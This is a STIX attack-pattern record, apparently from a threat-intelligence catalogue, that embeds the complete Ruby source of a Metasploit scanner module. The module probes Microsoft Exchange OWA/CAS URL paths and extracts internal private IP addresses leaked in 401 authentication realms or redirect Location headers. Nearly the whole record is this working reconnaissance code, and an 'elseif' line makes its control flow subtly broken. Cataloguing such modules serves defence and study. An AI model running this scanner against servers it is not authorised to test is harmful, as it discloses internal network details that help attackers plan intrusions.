{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--65adaf26-b72c-45be-8f87-7cd09bfd9a5d",
    "created": "2024-08-14T16:30:55.212032Z",
    "modified": "2024-08-14T16:30:55.212038Z",
    "name": "Outlook Web App (OWA) / Client Access Server (CAS) IIS HTTP Internal IP Disclosure",
    "description": " This module tests vulnerable IIS HTTP header file paths on Microsoft Exchange OWA 2003 and CAS 2007, 2010, and 2013 servers. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/owa_iis_internal_ip.rb",
            "external_id": "owa_iis_internal_ip.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n include Msf::Exploit::Remote::HttpClient\n include Msf::Auxiliary::Scanner\n\n def initialize\n    super(\n      'Name'           => 'Outlook Web App (OWA) / Client Access Server (CAS) IIS HTTP Internal IP Disclosure',\n      'Description'    => %q{\n        This module tests vulnerable IIS HTTP header file paths on Microsoft\n        Exchange OWA 2003 and CAS 2007, 2010, and 2013 servers.\n      },\n      'Author'         =>\n        [\n          'Nate Power'\n        ],\n      'DisclosureDate' => 'Dec 17 2012',\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => {\n        'SSL' => true\n      }\n    )\n\n   register_options(\n       [\n        OptInt.new('TIMEOUT', [ true, \"HTTP connection timeout\", 10]),\n        OptInt.new('RPORT', [ true, \"The target port\", 443]),\n       ])\n  end\n\n  def run_host(target_host)\n   rhost = target_host\n   print_status(\"#{msg} Checking HTTP headers\")\n   get_ip_extract\n  end\n\n  def get_ip_extract\n    urls = [\"/Microsoft-Server-ActiveSync/default.eas\",\n      \"/Microsoft-Server-ActiveSync\",\n      \"/Autodiscover/Autodiscover.xml\",\n      \"/Autodiscover\",\n      \"/Exchange\",\n      \"/Rpc\",\n      \"/EWS/Exchange.asmx\",\n      \"/EWS/Services.wsdl\",\n      \"/EWS\",\n      \"/ecp\",\n      \"/OAB\",\n      \"/OWA\",\n      \"/aspnet_client\",\n      \"/PowerShell\"]\n\n    result = nil\n\n    urls.each do |url|\n      begin\n        res = send_request_cgi({\n          'version' => \"1.0\",\n          'uri'      => \"#{url}\",\n          'method'   => 'GET',\n          'vhost'  =>  ''\n        }, timeout = datastore['TIMEOUT'])\n\n      rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT\n        print_error(\"#{msg} HTTP Connection Failed\")\n        next\n      end\n\n      if not res\n        print_error(\"#{msg} HTTP Connection Timeout\")\n        next\n      end\n\n      if res and res.code == 401 and (match = res['WWW-Authenticate'].match(/Basic realm=\\\"(192\\.168\\.[0-9]{1,3}\\.[0-9]{1,3}|10\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}|172\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})\\\"/i))\n        result = match.captures[0]\n        print_status(\"#{msg} Status Code: 401 response\")\n        print_status(\"#{msg} Found Path: \" + url )\n        print_good(\"#{msg} Found target internal IP address: \" + result)\n        return result\n       elseif\n        print_warning(\"#{msg} No internal address found\")\n        next\n      end\n\n      if res and (res.code > 300 and res.code < 310) and (match = res['Location'].match(/^https?:\\/\\/(192\\.168\\.[0-9]{1,3}\\.[0-9]{1,3}|10\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}|172\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})\\//i))\n        result = match.captures[0]\n        print_status(\"#{msg} Status Code: #{res.code} response\")\n        print_status(\"#{msg} Found Path: \" + url )\n        print_good(\"#{msg} Found target internal IP address: \" + result)\n        return result\n       elseif\n        print_warning(\"#{msg} No internal address found\")\n        next\n      end\n    end\n\n    if result.nil?\n      print_warning(\"#{msg} Nothing found\")\n    end\n\n    return result\n  end\n  def msg\n    \"#{rhost}:#{rport} -\"\n  end\nend\n",
    "x_mitre_disclosure_date": "Dec 17 2012"
}